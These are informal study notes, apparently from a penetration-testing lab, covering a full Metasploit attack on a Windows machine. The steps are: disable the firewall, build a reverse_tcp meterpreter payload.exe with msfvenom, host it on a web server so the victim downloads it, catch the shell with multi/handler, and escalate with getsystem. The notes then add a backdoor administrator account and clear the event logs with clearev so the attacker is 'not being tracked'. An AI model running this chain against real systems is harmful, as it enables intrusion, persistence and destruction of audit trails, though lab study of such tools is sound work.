1. Using the metaspolit framework

''
this is the most widely used tool in exploiting vulnerabilities
metasploit has a modular and flexible architecture that helps you
develop new exploits as more and more vulns are discovered.
it is also uesd in pentesting

you can use metaspolit with or without a database

if you configure the database metasploit will be able to track what youdo within the framework.

''

1. Switching off the windows firewall

> get to control panel
> system and security
> windows firewall
> turn off firewall
> turn off firewall for all three


> you can find Metasploit modules either from within the Metasploit fra  mework or from its Website. On the Metasploit Website, you can search  the vulnerabilities matching to a specific module. There are differen  t methods of searching. For example, you can search using any of the   following:

    Common Vulnerabilities and Exposures (CVE) number
    Open Sourced Vulnerability Database (OSVDB) ID
    Bugtraq ID
    Microsoft Security Bulletin
    Module information


2. within msfconsole

setting RHOST RPORT SMBPIPE (per the example we are following)

> HOST: This is the remote host that you want to exploit. For example,   if the IP address of the remote host is 192.168.0.5, you need to set   th  is as set RHOST 192.168.0.5.
    RPORT: This is the port that you need to attack the remote host. Si  nce this exploit is meant for Windows SMB service, it uses the defaul  t port for SMB, which is 445.
    SMBPIPE: This is also using the default value, which is the Browser  You can keep the default value.

3. Using Payloads

''

after the exploit executes on the target, you need to tell it the action it needs to perform. This is done by loading the payload, which is designed to perform specific tasks.

''

A. Finding a compatible Payloads

> Metasploit has 100's of payloads
> they are not all compatible with the version of windows that is suppo  sed to be the target.
> you CAN still find the payloads that are compatible... heres how

  > show payloads

  > set PAYLOAD windows/shell/reverse_tcp

 
4. Types of Shells

''

there are two different types of shells; reverse shells and bind shells

''

> Bind Shells 

- a bind shell is a shell that instructs the victim's mac  hine to open  a comand shell. 

- the specified port within the command is used for listening to the 
  connection from the attacker's system, which connects to the vict      m's system on the specified port
  
> Reverse Shells

- a reverse shell forces the connection back to the attacker"s system,   which uses an open local port and listens for the connection on this   port


5. Creating Standalone Payloads with Msfvenom

> combination of 2 different tools: Msfpayload/ Msfencode both a part
  of kali linux

> both tools still exist in kali as independent tools

> msfvenom was designed to create standalone payloads

> you dont have to start meta to use it and it works directly on the
  command line in kali


msfvenom -l payloads

example:
windows/meterpreter/reverse_tcp LHOST=192.168.0.3 -f exe -o payload.exe

Sharing the Payload with the Victim

> After creating a payload, you need to ensure that it reaches the vict  im’s system by any means. For example, you can share it on a USB, whi  ch may not be possible if you are sitting in another city or country.  The easiest method can be to share it on the Web, which can be downlo  aded by the victim.


step 1

> let's now copy payload.exe to the webserver(root directory for all we  b stuff directory)


cp payload.exe /var/www/html

> browse to 
  http://192.168.0.3/payload.exe

6. Use the Multi/handler module and exploit the system

> standalone modules cannot create a connection between you and the vic  tim's system.

> the only method is to use the multi/handler module which will catch
  the meterpreter connection when the payload.exe is executed on the vi  ctim's system

A. summon msfconsole

> use multi/handler

> set payload windows/meterpreter/reverse_tcp

> set LHOST 192.168.0.3

> exploit

> victim now run malicious payload.exe

> we now have a meterprete session

> run getuid

> priv esc run getsystem

> run getuid again and volia 

> now type shell 

> whoami

> ntauthority  AKA ROOT!! : )))ear

> net users 

7. 

> you have seen the existing users present on the PLABWIN810 system. Yo  u can always keep a persistent control over the system by creating a   user with administrative privileges. First, let’s create a new user o  n the PLABWIN810 system. Type the following command:


net user /add plab Test**1234

> now lets add him to the admins group

net localgroup administrators plab /add 

> you can use 'net users' command to make sure it was added

> once you are done type exit and you will return to your meterpreter
  prompt

> to make sure that you are not being tracked, you can remove any kind   of traces that the payload must have left behind. To do this, you nee  d to clear all the logs on the Windows system. Type the following com  mand:
'clearev'





























